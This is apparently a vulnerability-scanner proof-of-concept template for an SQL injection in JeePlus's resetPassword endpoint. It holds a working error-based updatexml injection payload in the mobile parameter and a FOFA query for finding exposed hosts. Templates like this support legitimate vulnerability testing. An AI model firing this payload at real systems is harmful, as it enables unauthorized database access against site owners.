id: poc-yaml-jeeplus-resetpassword-sqli
info:
  name: JeePlus快速开发平台 resetpassword SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: JeePlus快速开发平台
  fofa: app="JeePlus"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /a/sys/user/resetPassword?mobile=18888888888%27and%20(updatexml(1,concat(0x7e,(select%20md5({{.t1}})),0x7e),1))%23
  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,"Error
    querying database") && contains(body,substr(t2,0,31))
transport: http
